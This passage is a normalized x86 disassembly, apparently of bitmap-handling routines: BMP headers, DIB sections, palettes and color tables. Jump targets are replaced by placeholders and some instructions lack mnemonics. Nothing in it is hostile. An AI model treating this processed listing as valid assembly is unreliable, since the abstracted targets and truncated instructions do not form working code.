call LeaveCriticalSection
retn
sub_3a8ed7c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_3a8f314
pop edx
pop edi
pop esi
pop ebx
retn
sub_3a8eda4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_3a62ee0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_3a8f2c5
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_3a8f298
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_3a63a44
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
movzx edx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
movzx edx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_3a8a624
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
movzx eax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_3a7ce38
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_3a63a44
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
movzx eax [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
mov eax [ ebx + 0x20 ]
movzx edx [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
movzx eax [ ebx + 0xe ]
call sub_3a8a8b4
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_3a8a8d4
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
push 0x0
call GetDC
call sub_3a8a744
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_3a8f213
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_3a8ab80
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_3a62ee0
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_3a8f17b
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_3a8a744
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_3a8f14f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_3a8ae3c
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_3a6ea2c
call sub_3a8a624
jmp r-xdata
xor eax eax
push ebp
push sub_3a8f1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_3a7cdc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8f156
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a8f21a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_3a6ea2c
call sub_3a8a624
jmp r-xdata
sub_3a8f156
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_3a62efc
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_3a8f21a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_3a63a44
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_3a8f2af
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_3a8ae3c
mov [ ebp - 0x30 ] eax
sub_3a8f2cc
lea eax [ ebp - 0x9c ]
push eax
movzx eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_3a8ec7c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a8f314
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_3a8ea0c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_3a7cdc8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_3a63a44
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_3a8ec7c
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_3a8eda4
call sub_3a8a624
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_3a8f384
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_3a8ea0c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_3a63a44
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_3a8df94
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_3a8f41f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_3a8ec7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_3a8f448
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_3a8e844
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_3a8ea0c
mov eax esi
call sub_3a8eb1c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_3a8ea0c
mov eax esi
call sub_3a8eb1c
mov eax esi
call sub_3a8e998
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_3a8df94
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_3a8e3a4
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
movzx edx [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_3a8ec7c
jmp r-xdata
push esp
movzx edx [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_3a8ec7c
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_3a8d930
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_3a8f584
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x28 ]
mov edx [ eax + 0x1c ]
mov ecx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edi
pop esi
pop ebx
retn
sub_3a8f5a0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3a8ea1c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
movzx eax bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_3a8e3a4
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_3a8f61c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_3a8ea0c
mov eax ebx
call sub_3a8ea1c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_3a8d930
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a8f6b4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
movzx eax [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a8ec7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_3a8d828
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_3a883e4
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_3a8f6b9
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_3a64c5c
call sub_3a64cb0
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_3a8d828
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a8f6f0
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3a8e8c4
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_3a8a60c
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_3a63a44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
movzx edx bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_3a8f83c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a8e3a4
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_3a8a744
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_3a8f858
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x28 ]
mov ecx [ eax + 0x20 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edi
pop esi
pop ebx
retn
sub_3a8f87c
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_3a63a44
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_3a8e998
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_3a8b598
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_3a7ce00
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_3a7ce00
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_3a63a44
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_3a8e7d8
movzx edx [ r-xdata ]
call sub_3a8a41c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_3a8a744
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
movzx eax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_3a8d8e4
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_3a7ce00
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_3a7ce00
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
movzx edx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
movzx edx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
movzx eax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_3a7ce00
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_3a7ce00
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
movzx eax [ ebp + 0x70 ]
movzx ecx [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_3a7ce00
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_3a7ce00
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_3a8abbc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_3a7ce00
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_3a8aee0
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
add eax eax
add eax eax
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_3a8fb3c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_3a8ea1c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_3a8d930
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_3a8fbb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_3a8df94
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3a8fbdc
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebp ecx
mov edi edx
mov esi eax
mov ebx [ esi + 0x28 ]
cmp edi [ ebx + 0x1c ]
jne r-xdata
mov eax esi
call sub_3a8ea1c
push esi
push edi
lea esi [ ebx + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x8 ] ebp
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] ebp
push esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_3a8e3a4
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebp [ ebx + 0x20 ]
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a8fc40
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8fc88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a8b8e0
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_3a8d75c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a8fcdc
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_3a8d760
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a8fd0c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_3a8ffe8
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_3a8d75c
mov eax [ esi + 0x28 ]
call sub_3a8d760
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_3a7aad0
pop edi
